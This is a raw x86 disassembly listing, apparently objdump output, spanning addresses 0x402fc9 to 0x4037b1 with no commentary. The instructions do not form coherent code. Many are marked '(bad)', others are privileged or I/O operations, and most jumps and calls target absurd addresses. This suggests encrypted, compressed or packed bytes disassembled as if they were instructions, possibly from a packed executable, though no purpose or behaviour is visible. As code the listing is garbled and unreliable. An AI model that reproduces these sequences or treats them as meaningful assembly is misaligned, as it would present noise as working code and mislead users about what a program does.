  402fc9:	mov    BYTE PTR [edi-0x34],cl
  402fcc:	lds    edx,FWORD PTR [esi+0x52ac7484]
  402fd2:	stos   DWORD PTR es:[edi],eax
  402fd3:	cmp    ecx,ebx
  402fd5:	das    
  402fd6:	lock int3 
  402fd8:	xchg   ebx,eax
  402fd9:	outs   dx,BYTE PTR ds:[esi]
  402fda:	stos   DWORD PTR es:[edi],eax
  402fdb:	idiv   BYTE PTR ds:0x3e4ef46e
  402fe1:	jg     0x403024
  402fe3:	dec    edi
  402fe4:	loop   0x402f99
  402fe6:	(bad)  [ebx]
  402fe8:	gs (bad) 
  402fea:	jecxz  0x402fd1
  402fec:	(bad)  
  402fed:	imul   esp,DWORD PTR [ebp-0x46],0xaa1d5283
  402ff4:	xor    al,0xbe
  402ff6:	push   0x8fd866a4
  402ffb:	loope  0x402f9e
  402ffd:	inc    edi
  402ffe:	leave  
  402fff:	ins    BYTE PTR es:[edi],dx
  403000:	mov    edi,0xd0199599
  403005:	xchg   ebx,eax
  403006:	xchg   cx,ax
  403008:	sbb    dl,BYTE PTR [eax-0x47]
  40300b:	jp     0x403080
  40300d:	mov    eax,ds:0xd0002d20
  403012:	jae    0x403005
  403014:	jmp    0xc9f3b6c
  403019:	test   DWORD PTR [ebp-0x49],ebp
  40301c:	mov    ah,0xea
  40301e:	std    
  40301f:	mov    ebp,0x9c421ba2
  403024:	ds xchg edi,ecx
  403027:	mov    ecx,0x76818595
  40302c:	push   ecx
  40302d:	js     0x40305d
  40302f:	adc    cl,BYTE PTR [edx]
  403031:	mov    ah,al
  403033:	mov    edi,0x9154ff18
  403038:	xor    bh,ah
  40303a:	hlt    
  40303b:	hlt    
  40303c:	(bad)  [eax]
  40303e:	addr16 cdq 
  403040:	cmp    eax,0x30b206a4
  403045:	stc    
  403046:	or     esi,ebp
  403048:	jbe    0x402feb
  40304a:	sub    al,0xa
  40304c:	dec    esp
  40304d:	push   ss
  40304e:	aas    
  40304f:	xor    ah,BYTE PTR [edx+0x39]
  403052:	jmp    0x40303b
  403054:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403055:	jb     0x402fee
  403057:	out    0x6f,eax
  403059:	dec    edx
  40305a:	pop    esi
  40305b:	or     al,0x99
  40305d:	xchg   ebp,eax
  40305e:	mov    ebx,0x7dafab70
  403063:	sub    ebx,0xd0a528a3
  403069:	scas   al,BYTE PTR es:[edi]
  40306a:	add    dl,BYTE PTR ds:0xdaf0c4a0
  403070:	push   0x6b5351c5
  403075:	dec    edx
  403076:	jecxz  0x4030d2
  403078:	inc    edx
  403079:	daa    
  40307a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40307b:	sub    al,0x13
  40307d:	mov    dh,0x64
  40307f:	neg    BYTE PTR [ecx+0x72]
  403082:	(bad)  
  403084:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403085:	in     eax,0x28
  403087:	sub    bh,0x8d
  40308a:	push   edx
  40308b:	out    dx,eax
  40308c:	dec    ecx
  40308d:	stos   BYTE PTR es:[edi],al
  40308e:	dec    ebp
  40308f:	jae    0x403040
  403091:	xor    al,0x48
  403093:	mov    ss,WORD PTR [eax-0x64]
  403096:	mov    BYTE PTR [esi+0x540cb16d],ch
  40309c:	jnp    0x40307b
  40309e:	mov    BYTE PTR [ecx-0x50286882],cl
  4030a4:	dec    esi
  4030a5:	stos   DWORD PTR es:[edi],eax
  4030a6:	loopne 0x403099
  4030a8:	loop   0x4030a3
  4030aa:	sub    eax,0x99504f32
  4030af:	mov    ebp,0xe6cd3f54
  4030b4:	retf   
  4030b5:	(bad)
  4030b8:	rol    BYTE PTR [ecx],1
  4030ba:	or     BYTE PTR [edi+0x56],dh
  4030bd:	xchg   DWORD PTR [ebx+0x277e2255],edi
  4030c3:	jl     0x403134
  4030c5:	dec    ecx
  4030c6:	xor    DWORD PTR [ebp+0x6225415],0xffffffb3
  4030cd:	jp     0x4030c9
  4030cf:	sbb    BYTE PTR [edx],0xc
  4030d2:	mov    edi,0xb4d97408
  4030d7:	sub    eax,0x78a1e96c
  4030dc:	enter  0xf72,0x53
  4030e0:	add    eax,0x7307612a
  4030e5:	(bad)  
  4030e6:	xor    BYTE PTR [esi],dh
  4030e8:	out    0xd3,eax
  4030ea:	es xchg ebp,eax
  4030ec:	jge    0x4030b2
  4030ee:	inc    edi
  4030ef:	sub    edi,ecx
  4030f1:	outs   dx,BYTE PTR ds:[esi]
  4030f2:	fcmovne st,st(4)
  4030f4:	mov    eax,cs:0x44a01cf4
  4030fa:	inc    esp
  4030fb:	das    
  4030fc:	nop
  4030fd:	push   ss
  4030fe:	outs   dx,DWORD PTR ds:[esi]
  4030ff:	fwait
  403100:	sbb    eax,0x44ef0216
  403105:	lods   eax,DWORD PTR ds:[esi]
  403106:	mov    esi,ecx
  403108:	pop    es
  403109:	shl    BYTE PTR [edi],1
  40310b:	and    al,0x97
  40310d:	pop    edi
  40310e:	cs inc ebx
  403110:	test   BYTE PTR [ecx+eiz*8+0x70628c8],0x79
  403118:	pop    ds
  403119:	fs jbe 0x40316c
  40311c:	ds adc bh,dh
  40311f:	cmp    al,0xb
  403121:	(bad)  
  403122:	test   eax,0x79720969
  403127:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403128:	outs   dx,BYTE PTR ds:[esi]
  403129:	outs   dx,BYTE PTR ds:[esi]
  40312a:	xor    BYTE PTR [esi+esi*2],cl
  40312d:	inc    ebp
  40312e:	jg     0x4030cf
  403130:	sbb    BYTE PTR [ebx+0x16a43655],bh
  403136:	loopne 0x403133
  403138:	mov    ah,cl
  40313a:	xor    eax,0xf72475d
  40313f:	jns    0x40317d
  403141:	sar    BYTE PTR [edx+0x60121b2b],1
  403147:	out    dx,al
  403148:	pop    eax
  403149:	xchg   edi,eax
  40314a:	cmp    cl,BYTE PTR [esi+0xfc38e11]
  403150:	sbb    ah,bh
  403152:	psubw  mm1,QWORD PTR [edi]
  403155:	bound  edx,QWORD PTR [ebx-0x73]
  403158:	add    eax,0x45f1ded
  40315d:	or     cl,BYTE PTR ds:0x9e24114d
  403163:	sub    BYTE PTR [ecx+0x50],cl
  403166:	ins    BYTE PTR es:[edi],dx
  403167:	dec    ebp
  403168:	ss push esi
  40316a:	cmp    dh,BYTE PTR ds:0xc3262812
  403170:	dec    ecx
  403171:	(bad)  
  403172:	pop    esi
  403173:	xor    BYTE PTR [edi+0x44aa8cee],dh
  403179:	test   DWORD PTR [ebx-0x68dc21c],ecx
  40317f:	sub    edx,DWORD PTR [esp+ecx*8-0x3d]
  403183:	ss jecxz 0x403202
  403186:	mov    edx,0xce84d1bf
  40318b:	dec    edi
  40318c:	jae    0x40316d
  40318e:	sar    DWORD PTR [ebp+0x6db7f4a],0x6
  403195:	dec    ecx
  403196:	mov    esi,0x1f9371dd
  40319b:	adc    BYTE PTR [ebp+0xc882035],0x17
  4031a2:	out    0xbf,al
  4031a4:	into   
  4031a5:	iret   
  4031a6:	inc    esi
  4031a7:	mov    ds:0xc240dad0,eax
  4031ac:	and    ebx,DWORD PTR [ebp-0x21]
  4031af:	in     eax,0xf2
  4031b1:	in     al,dx
  4031b2:	pushf  
  4031b3:	mov    bh,0xed
  4031b5:	outs   dx,DWORD PTR ds:[esi]
  4031b6:	inc    ebx
  4031b7:	(bad)  
  4031b8:	retf   
  4031b9:	dec    edi
  4031ba:	adc    BYTE PTR es:[eax-0x3e8628a5],cl
  4031c1:	dec    ecx
  4031c2:	cmc    
  4031c3:	or     eax,0x4b17c3b5
  4031c8:	pop    ds
  4031c9:	jle    0x403246
  4031cb:	xchg   DWORD PTR [ecx],ebx
  4031cd:	or     eax,0x49b5756e
  4031d2:	not    DWORD PTR [eax+0x2dedbc92]
  4031d8:	inc    eax
  4031d9:	test   DWORD PTR [ebp+ebp*4+0x8],edx
  4031dd:	lods   eax,DWORD PTR ds:[esi]
  4031de:	enter  0x62f2,0x63
  4031e2:	inc    BYTE PTR [eax+0x3ad59637]
  4031e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031e9:	test   DWORD PTR [ebx+ebp*1-0x37e00c75],edi
  4031f0:	mov    edx,ds
  4031f2:	fisttp WORD PTR ss:[ebp-0x1167b9b1]
  4031f9:	mov    esp,DWORD PTR [edi+0x7e]
  4031fc:	jmp    0x1c557f11
  403201:	pusha  
  403202:	gs es adc al,0xff
  403206:	repz fdivr QWORD PTR [ecx-0x2feba115]
  40320d:	add    ch,BYTE PTR [ebx+0x76]
  403210:	sub    al,0xd5
  403212:	add    BYTE PTR [ecx],dl
  403214:	out    dx,eax
  403215:	push   ecx
  403216:	push   ebx
  403217:	lea    ebp,[esi+ebp*1]
  40321a:	xchg   cl,cl
  40321c:	add    al,0x98
  40321e:	ds cmc 
  403220:	lea    ecx,[ebx-0x16]
  403223:	in     eax,0x1f
  403225:	xor    DWORD PTR [edx+0x26],esp
  403228:	add    eax,0xc5b77362
  40322d:	sar    dh,0x62
  403230:	sub    edi,edx
  403232:	pop    ecx
  403233:	mov    ss,WORD PTR [edx]
  403235:	dec    edx
  403236:	xchg   edx,eax
  403237:	cmc    
  403238:	icebp  
  403239:	aas    
  40323a:	xlat   BYTE PTR ds:[ebx]
  40323b:	ins    DWORD PTR es:[di],dx
  40323d:	jp     0x4032a7
  40323f:	(bad)  
  403240:	and    ebp,DWORD PTR [ebx]
  403242:	out    0xc5,al
  403244:	outs   dx,DWORD PTR ds:[esi]
  403245:	jnp    0x4032b3
  403247:	pop    ebx
  403248:	(bad)  
  403249:	stc    
  40324a:	jmp    0x1d3a2f9e
  40324f:	sar    DWORD PTR [ebp+0x6ace1b78],cl
  403255:	aad    0x46
  403257:	pusha  
  403258:	fistp  WORD PTR [esi-0x6e]
  40325b:	sbb    BYTE PTR [eax],cl
  40325d:	jmp    0xb18c:0x99d6d4d8
  403264:	sub    bl,BYTE PTR [edi+ebx*8+0x121bec18]
  40326b:	lods   eax,DWORD PTR ds:[esi]
  40326c:	loop   0x40329b
  40326e:	pop    ebx
  40326f:	aaa    
  403270:	leave  
  403271:	xchg   edi,edi
  403273:	mov    BYTE PTR [ecx-0x4d],al
  403276:	dec    ecx
  403277:	dec    edx
  403278:	jmp    0x40326f
  40327a:	adc    al,0xc4
  40327c:	ret    0xb5f9
  40327f:	cld    
  403280:	xchg   esi,eax
  403281:	rol    DWORD PTR [edi-0x1c88ae61],0x3
  403288:	jmp    0xae95:0x7096bf64
  40328f:	neg    DWORD PTR [ecx+0x23a6b720]
  403295:	outs   dx,DWORD PTR ds:[esi]
  403296:	pusha  
  403297:	ret    0x654d
  40329a:	test   bh,al
  40329c:	or     al,0x56
  40329e:	mov    al,BYTE PTR [ebx+0x22]
  4032a1:	jbe    0x403231
  4032a3:	xchg   edx,eax
  4032a4:	add    BYTE PTR [eax+0xe],ah
  4032a7:	ds sub al,0x34
  4032aa:	mov    edi,0x5f50110d
  4032af:	hlt    
  4032b0:	fs cmp esp,ebp
  4032b3:	inc    ah
  4032b5:	cs jp  0x4032a4
  4032b8:	xchg   ecx,eax
  4032b9:	dec    ecx
  4032ba:	xchg   edx,eax
  4032bb:	ja     0x403285
  4032bd:	pop    ss
  4032be:	and    al,0xbb
  4032c0:	fmul   st(5),st
  4032c2:	dec    esi
  4032c3:	shr    DWORD PTR [ecx-0x30b8a53e],0x48
  4032ca:	add    BYTE PTR [eax],bh
  4032cc:	push   esp
  4032cd:	imul   esi,ebp,0xb607b502
  4032d3:	dec    edx
  4032d4:	jmp    0xc43a:0x53414975
  4032db:	jbe    0x403315
  4032dd:	add    ch,BYTE PTR [ebp-0x38]
  4032e0:	mov    cl,0x34
  4032e2:	cmp    BYTE PTR [ebp+0x67],ch
  4032e5:	fnstsw WORD PTR [esi]
  4032e7:	inc    edi
  4032e8:	dec    edi
  4032e9:	out    dx,al
  4032ea:	push   esp
  4032eb:	xchg   ecx,eax
  4032ec:	dec    ebx
  4032ed:	js     0x403278
  4032ef:	mov    dh,0x7a
  4032f1:	(bad)  
  4032f2:	cli    
  4032f3:	fdivr  QWORD PTR [ebx]
  4032f5:	adc    eax,0xf5d86cdf
  4032fa:	xchg   ecx,eax
  4032fb:	adc    BYTE PTR [ecx-0x57],cl
  4032fe:	cmp    edx,DWORD PTR [eax-0x36868501]
  403304:	sub    eax,0x95840810
  403309:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40330a:	iret   
  40330b:	dec    eax
  40330c:	loop   0x4032ac
  40330e:	lods   al,BYTE PTR ds:[esi]
  40330f:	call   DWORD PTR [eax]
  403311:	add    BYTE PTR ds:0xace15e8e,bl
  403317:	hlt    
  403318:	push   0x28
  40331a:	mov    DWORD PTR [edi+0x77],0x79eb2fe
  403321:	push   ds
  403322:	out    dx,eax
  403323:	repz jge 0x403368
  403326:	call   0xc773551c
  40332b:	in     eax,dx
  40332c:	jmp    0x40334b
  40332e:	cdq    
  40332f:	ret    
  403330:	cmp    ebp,0x5a
  403333:	jp     0x403300
  403335:	sbb    esi,DWORD PTR [esi]
  403337:	push   0xffffffc9
  403339:	sbb    BYTE PTR [edx+0x78],dh
  40333c:	scas   eax,DWORD PTR es:[edi]
  40333d:	imul   esp,DWORD PTR [ecx-0x177f234b],0x2e
  403344:	inc    eax
  403345:	icebp  
  403346:	icebp  
  403347:	fist   DWORD PTR [esi]
  403349:	mov    WORD PTR [edi+0x2e],fs
  40334c:	push   ss
  40334d:	out    dx,al
  40334e:	aad    0xf4
  403350:	test   al,0xa5
  403352:	xor    al,BYTE PTR [ebx+0x75afaf56]
  403358:	mov    ch,0xcf
  40335a:	inc    ecx
  40335b:	xor    ebp,DWORD PTR [ecx+esi*4+0x4176d740]
  403362:	mov    esi,0x33327ba7
  403367:	mov    dl,al
  403369:	push   ecx
  40336a:	imul   DWORD PTR [edx+0x6a00531b]
  403370:	adc    al,0x7e
  403372:	pop    ebp
  403373:	push   edi
  403374:	fcomp  DWORD PTR [edi+0x2463df70]
  40337a:	pop    edx
  40337b:	dec    ebx
  40337c:	bound  edi,QWORD PTR [esi-0x4d]
  40337f:	add    DWORD PTR [edi],0x24
  403382:	int3   
  403383:	clc    
  403384:	pop    ss
  403385:	dec    esi
  403386:	test   DWORD PTR [edx-0x7a],ebx
  403389:	push   ss
  40338a:	jns    0x4033d7
  40338c:	push   es
  40338d:	jp     0x403390
  40338f:	cld    
  403390:	out    dx,al
  403391:	mov    ecx,DWORD PTR [edx+ebp*1-0x66]
  403395:	pop    esp
  403396:	outs   dx,BYTE PTR ds:[esi]
  403397:	xchg   esi,eax
  403398:	retf   0x7e4b
  40339b:	ins    DWORD PTR es:[edi],dx
  40339c:	lds    esi,FWORD PTR [edx+ecx*2]
  40339f:	mov    al,BYTE PTR [edx-0x61]
  4033a2:	mov    edi,0xcd306750
  4033a7:	mov    esp,0x6c0b5200
  4033ac:	jb     0x40333d
  4033ae:	push   0x2f87d151
  4033b3:	jbe    0x403409
  4033b5:	adc    ebp,DWORD PTR [ebx+0x1a]
  4033b8:	xchg   DWORD PTR [esi],edx
  4033ba:	scas   al,BYTE PTR es:[edi]
  4033bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4033bc:	shl    DWORD PTR [edx-0x59],cl
  4033bf:	add    eax,0x6b2ac7fd
  4033c4:	loopne 0x4033f4
  4033c6:	sbb    DWORD PTR [ecx-0x11384a56],0xa7ff0929
  4033d0:	enter  0xb3b7,0xd9
  4033d4:	test   eax,0xd18d837b
  4033d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033da:	test   eax,0x2569674
  4033df:	adc    cl,BYTE PTR [ebx-0x7144ba6a]
  4033e5:	xchg   DWORD PTR [esi+0x67],esi
  4033e8:	test   al,0x1e
  4033ea:	test   al,0x10
  4033ec:	or     eax,0x23b615ff
  4033f1:	fistp  DWORD PTR [edx]
  4033f3:	int3   
  4033f4:	mov    dh,0xf3
  4033f6:	lock leave 
  4033f8:	pop    edi
  4033f9:	pop    ebp
  4033fa:	shr    DWORD PTR [edi-0x4122a4ed],1
  403400:	seto   BYTE PTR [edi-0x12d81d35]
  403407:	and    eax,0x83f6fd06
  40340c:	cmp    DWORD PTR [esp+eax*1],0xffffffc5
  403410:	jle    0x403472
  403412:	cli    
  403413:	fstp   TBYTE PTR [ebp+esi*2+0xbd2f40b]
  40341a:	pop    esp
  40341b:	fidivr WORD PTR ds:0xf43eaa16
  403421:	inc    edi
  403422:	neg    bl
  403424:	shl    BYTE PTR [edi+0x73],1
  403427:	jns    0x403409
  403429:	jmp    0xd5c6:0x27f21e84
  403430:	adc    DWORD PTR [edi],edi
  403432:	nop
  403433:	add    eax,0x95e2bd84
  403438:	test   BYTE PTR [eax],ah
  40343a:	mov    BYTE PTR [esi-0x2546c110],dh
  403440:	and    eax,0x8dc6cc16
  403445:	push   0xffffffff
  403447:	lds    ebp,FWORD PTR [ebp+0x3c]
  40344a:	clc    
  40344b:	cwde   
  40344c:	test   BYTE PTR [edx+0x7f454095],ch
  403452:	jecxz  0x4034b9
  403454:	lock test eax,0xed5a37d5
  40345a:	ret    
  40345b:	add    al,0x42
  40345e:	add    al,0x26
  403460:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403461:	xchg   dl,bl
  403463:	push   esi
  403464:	push   cs
  403465:	mov    ebx,0x79b725ed
  40346a:	dec    esp
  40346b:	js     0x4034de
  40346d:	fadd   QWORD PTR [edx+0x1571d108]
  403473:	(bad)  
  403474:	hlt    
  403475:	or     ch,BYTE PTR [ebx-0x4a]
  403478:	xor    eax,0xc5bf1dc7
  40347d:	daa    
  40347e:	fxch   st(6)
  403480:	jecxz  0x40340d
  403482:	xchg   edx,eax
  403483:	outs   dx,BYTE PTR ds:[esi]
  403484:	std    
  403485:	pop    ebp
  403486:	mov    DWORD PTR [edx],0x7dd284b7
  40348c:	or     bh,BYTE PTR [esi+esi*8-0x712b5833]
  403493:	xor    edx,DWORD PTR [ebp-0x2a]
  403496:	xchg   edi,eax
  403497:	mov    cs,WORD PTR [ecx-0x24]
  40349a:	push   es
  40349b:	shl    DWORD PTR [bx+0x5b2a],cl
  4034a0:	dec    ebp
  4034a1:	scas   al,BYTE PTR es:[edi]
  4034a2:	pop    es
  4034a3:	xchg   esi,eax
  4034a4:	push   eax
  4034a5:	ret    
  4034a6:	push   es
  4034a7:	jle    0x403431
  4034a9:	lods   eax,DWORD PTR ds:[esi]
  4034aa:	addr16 jb 0x403480
  4034ad:	mov    edx,0xd6b375a6
  4034b2:	add    ebx,DWORD PTR [esi]
  4034b4:	fisubr WORD PTR [ecx]
  4034b6:	xor    ah,BYTE PTR [eax-0x309d9b6b]
  4034bc:	bound  esi,QWORD PTR ds:0x10cd69d0
  4034c2:	pop    esp
  4034c3:	in     al,0x32
  4034c5:	push   esi
  4034c6:	stos   BYTE PTR es:[edi],al
  4034c7:	scas   al,BYTE PTR es:[edi]
  4034c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034c9:	out    0xe5,eax
  4034cb:	mov    dh,0x5c
  4034cd:	aad    0x13
  4034cf:	sub    BYTE PTR [edx-0x19b2a99],0xc6
  4034d6:	inc    eax
  4034d7:	std    
  4034d8:	push   edi
  4034d9:	or     ecx,DWORD PTR [eax]
  4034db:	cdq    
  4034dc:	ss push ds
  4034de:	dec    eax
  4034df:	pop    esi
  4034e0:	sbb    al,0x11
  4034e2:	sbb    esp,ebx
  4034e4:	fbld   TBYTE PTR [ebp-0x69f1c7ce]
  4034ea:	aad    0xe4
  4034ec:	out    0x39,al
  4034ee:	ret    
  4034ef:	repz inc ebp
  4034f1:	xor    eax,0x93ed6010
  4034f6:	popa   
  4034f7:	test   BYTE PTR [eax],dl
  4034f9:	inc    edi
  4034fa:	inc    eax
  4034fb:	fisubr DWORD PTR [edi+0x35]
  4034fe:	adc    bl,ah
  403500:	inc    BYTE PTR [eax-0x17c6d970]
  403506:	xor    DWORD PTR [eax-0x8],0x23
  40350a:	leave  
  40350b:	icebp  
  40350c:	mov    bh,0xb7
  40350e:	xor    al,0x9a
  403510:	jno    0x4034f0
  403512:	imul   ebp,ebp,0x55
  403515:	pop    ebp
  403516:	pop    ebx
  403517:	int    0x9c
  403519:	getsec 
  40351b:	popf   
  40351c:	fcmovnb st,st(0)
  40351f:	or     dl,al
  403521:	punpcklwd mm2,mm7
  403524:	push   ss
  403525:	in     al,dx
  403526:	mov    ch,0xd5
  403528:	and    BYTE PTR [ecx],0x18
  40352b:	in     eax,dx
  40352c:	add    al,0x10
  40352e:	add    al,cl
  403530:	jmp    0x1bdc01c8
  403535:	cli    
  403536:	xchg   edx,eax
  403537:	adc    ebp,ebx
  403539:	mov    eax,ds:0xe0d39d48
  40353e:	(bad)  
  40353f:	dec    ebx
  403540:	aas    
  403541:	inc    esp
  403542:	push   ss
  403543:	mov    edi,0x18a4d409
  403548:	xchg   ecx,eax
  403549:	in     eax,dx
  40354a:	mov    edi,0xe5e4729c
  40354f:	icebp  
  403550:	leave  
  403551:	mov    edi,0x58cfc94f
  403556:	popa   
  403557:	js     0x403581
  403559:	ret    0xde8
  40355c:	pop    ebp
  40355d:	mov    eax,ds:0xc3671b41
  403562:	mov    cl,0x7
  403564:	sub    edx,DWORD PTR [ebx+0x3eef6958]
  40356a:	dec    ebp
  40356b:	vpsrlq xmm5,xmm4,XMMWORD PTR [esi-0x28]
  403570:	add    al,0x30
  403572:	leave  
  403573:	and    al,0x24
  403575:	add    dl,BYTE PTR [edx]
  403577:	cwde   
  403578:	(bad)  
  403579:	std    
  40357a:	push   0x3c96dd85
  40357f:	pusha  
  403580:	test   BYTE PTR [ecx+0x4d5a10],0x8
  403587:	adc    dl,BYTE PTR [ebp+0x33]
  40358a:	dec    edi
  40358b:	shr    BYTE PTR ds:0x477ec435,0x0
  403592:	xchg   ebx,eax
  403593:	dec    ecx
  403594:	dec    edi
  403595:	loopne 0x4035cc
  403597:	mov    bl,0x43
  403599:	repz xchg ebp,eax
  40359b:	inc    ebx
  40359c:	cwde   
  40359d:	pusha  
  40359e:	push   esp
  40359f:	call   0x23ba:0x25941628
  4035a6:	dec    BYTE PTR [ebp-0x52764b4a]
  4035ac:	aam    0x6e
  4035ae:	outs   dx,BYTE PTR ds:[esi]
  4035af:	jl     0x4035f0
  4035b1:	out    0x10,eax
  4035b3:	ficom  WORD PTR [eax-0xc]
  4035b6:	jne    0x403616
  4035b8:	arpl   WORD PTR [ebx+ecx*4+0x75b45ed8],bx
  4035bf:	push   ecx
  4035c0:	call   0xe51da4cf
  4035c5:	sbb    dh,BYTE PTR [ebx]
  4035c7:	cmp    ebp,DWORD PTR [ebx]
  4035c9:	aas    
  4035ca:	xchg   edi,eax
  4035cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035cc:	push   eax
  4035cd:	push   0xd8980192
  4035d2:	xor    BYTE PTR [eax+0x10],dh
  4035d5:	mov    cs,ebp
  4035d7:	add    DWORD PTR [ebp+eax*2-0x52],eax
  4035db:	inc    eax
  4035dc:	iret   
  4035dd:	sbb    al,0x3d
  4035df:	ret    
  4035e0:	dec    esi
  4035e1:	(bad)  
  4035e2:	sub    ebp,eax
  4035e4:	pushf  
  4035e5:	xor    dh,BYTE PTR [ebx+0x23411f6b]
  4035eb:	jmp    0x4035d4
  4035ed:	stos   DWORD PTR es:[edi],eax
  4035ee:	mov    eax,0x82233954
  4035f3:	dec    ecx
  4035f4:	xchg   edi,eax
  4035f5:	ret    
  4035f6:	jmp    0x7cf2:0x8fac9ca2
  4035fd:	shl    BYTE PTR [eax+eiz*4-0x4416251b],cl
  403604:	cmp    DWORD PTR [ebx],0xffffffce
  403607:	sub    ch,BYTE PTR [ecx+0x38]
  40360a:	push   es
  40360b:	mov    esi,0x78235d95
  403610:	jno    0x40360a
  403612:	loope  0x403654
  403614:	cmp    edi,DWORD PTR ds:0xa6ecf2c4
  40361a:	cmp    bl,BYTE PTR [edx-0x4f]
  40361d:	xchg   edx,eax
  40361e:	fs (bad) 
  403621:	test   al,0x5d
  403623:	mov    eax,ds:0x3df87aa4
  403628:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403629:	aad    0xd3
  40362b:	xchg   edx,eax
  40362c:	and    bh,BYTE PTR [edi+0x72]
  40362f:	add    BYTE PTR [esi],ch
  403631:	sbb    DWORD PTR [eax-0x29b4101a],0xffffff86
  403638:	dec    esi
  403639:	(bad)  
  40363a:	pop    ecx
  40363b:	or     DWORD PTR ds:0xf301a738,0x3
  403642:	or     eax,0x16089ecc
  403647:	sbb    DWORD PTR [eax],ebx
  403649:	daa    
  40364a:	xchg   esi,eax
  40364b:	rcl    BYTE PTR [ebx-0x5aba1fda],1
  403651:	sbb    al,0xfa
  403653:	push   ecx
  403654:	ins    DWORD PTR es:[edi],dx
  403655:	add    al,0x8a
  403657:	fcomp  st(7)
  403659:	jb     0x403648
  40365b:	cmp    esp,ebx
  40365d:	retf   0xec9
  403660:	in     eax,dx
  403661:	xchg   ebx,eax
  403662:	leave  
  403663:	pop    ds
  403664:	scas   al,BYTE PTR es:[edi]
  403665:	pop    DWORD PTR [edx]
  403667:	sub    DWORD PTR [eax-0x7be9aa2e],edx
  40366d:	cmp    BYTE PTR [edi],0x87
  403670:	test   al,0xbc
  403672:	xor    al,0x4f
  403674:	or     DWORD PTR [esi+esi*1+0x2500fe8d],edx
  40367b:	jmp    0x518ccc55
  403680:	adc    al,0xfa
  403682:	scas   al,BYTE PTR es:[edi]
  403683:	or     BYTE PTR [ebp+0xf47a6db],dl
  403689:	sub    al,0x8
  40368b:	loop   0x40363c
  40368d:	daa    
  40368e:	sbb    cl,BYTE PTR [eax+0x55]
  403691:	in     al,dx
  403692:	shr    BYTE PTR [esi-0x4e45290f],cl
  403698:	(bad)  
  403699:	push   ss
  40369a:	jmp    0x468d4d7d
  40369f:	sbb    DWORD PTR [ebp+0x7f],0xffffffbd
  4036a3:	les    edx,FWORD PTR [edi]
  4036a5:	pop    edi
  4036a6:	pcmpgtw mm7,mm0
  4036a9:	push   0x1483f3
  4036ae:	lock (bad) [edx]
  4036b1:	das    
  4036b2:	sub    al,0x20
  4036b4:	fsubrp st(5),st
  4036b6:	sbb    al,bh
  4036b8:	or     BYTE PTR [eax-0x7476be46],ah
  4036be:	fcomi  st,st(3)
  4036c0:	call   0xdb014286
  4036c5:	orps   xmm5,XMMWORD PTR [esi+0x20]
  4036c9:	xor    esp,DWORD PTR ds:0x6847a826
  4036cf:	loop   0x4036ee
  4036d1:	cli    
  4036d2:	mov    al,0xb0
  4036d4:	test   al,0x94
  4036d6:	fnsetpm(287 only) 
  4036d8:	add    ebp,DWORD PTR ds:0x452a0d0
  4036de:	or     edi,DWORD PTR [eax-0x17]
  4036e1:	pop    ds
  4036e2:	sbb    eax,0x5e0814be
  4036e7:	sub    ch,BYTE PTR [ebp+0x2b]
  4036ea:	mov    DWORD PTR ds:0xdb662ae,edx
  4036f0:	xchg   edi,eax
  4036f1:	jno    0x4036e7
  4036f3:	arpl   WORD PTR cs:[eax+0x60],bx
  4036f7:	ficom  WORD PTR [edi+ebp*4-0x7be1e868]
  4036fe:	cmp    BYTE PTR [edx+0x7fa9e6a8],al
  403704:	mov    al,ds:0xf4a83517
  403709:	enter  0x23a5,0xd
  40370d:	mov    cl,0x64
  40370f:	aas    
  403710:	test   eax,0xa0e4dcc
  403715:	cwde   
  403716:	pop    ds
  403717:	jne    0x4036b3
  403719:	and    BYTE PTR [edi-0x6b],bl
  40371c:	mov    dh,0x58
  40371e:	inc    esi
  40371f:	and    ch,0x92
  403722:	dec    ebp
  403723:	cwde   
  403724:	mov    bl,0xdd
  403726:	call   0x3824:0xe5b00662
  40372d:	dec    esp
  40372e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40372f:	and    al,0x54
  403731:	leave  
  403732:	or     eax,0x92ef7f45
  403737:	pusha  
  403738:	pslld  mm1,QWORD PTR [eax]
  40373b:	jle    0x40375d
  40373d:	inc    ebp
  40373e:	pop    ecx
  40373f:	jmp    0x53b7:0xbadeb1c9
  403746:	aad    0x91
  403748:	shl    BYTE PTR [edx-0x17],cl
  40374b:	xlat   BYTE PTR ds:[ebx]
  40374c:	lahf   
  40374d:	imul   esi,DWORD PTR [ecx+0x4ce7f6b1],0xc2c6c001
  403757:	adc    al,0xf5
  403759:	int3   
  40375a:	xchg   DWORD PTR [ebx],ebp
  40375c:	xchg   cl,bh
  40375e:	ins    DWORD PTR es:[edi],dx
  40375f:	ins    DWORD PTR es:[edi],dx
  403760:	dec    ecx
  403761:	add    WORD PTR [eax],dx
  403764:	lods   al,BYTE PTR ds:[esi]
  403765:	jecxz  0x4036ef
  403767:	adc    eax,0xc353575e
  40376c:	iret   
  40376d:	imul   ebp,DWORD PTR [edi+ebp*4+0x1e43b215],0xbeb87144
  403778:	cmp    DWORD PTR [ebp-0x53299f1c],edx
  40377e:	ret    0x4640
  403781:	aam    0xc9
  403783:	inc    esi
  403784:	pusha  
  403785:	mov    edi,0xb1f42545
  40378a:	call   0xf47fd45a
  40378f:	retf   0xf4b
  403792:	inc    edx
  403793:	jge    0x403793
  403795:	dec    edi
  403796:	cdq    
  403797:	loopne 0x403763
  403799:	pop    edx
  40379a:	and    al,0x42
  40379c:	dec    edi
  40379d:	push   ds
  40379e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40379f:	push   es
  4037a0:	sbb    al,0xd8
  4037a2:	adc    bl,cl
  4037a4:	(bad)  
  4037a5:	sub    dh,BYTE PTR [esi]
  4037a7:	fild   DWORD PTR [esi]
  4037a9:	fldcw  WORD PTR [ecx-0x484f5ac8]
  4037af:	jnp    0x40379a
  4037b1:	(bad)  
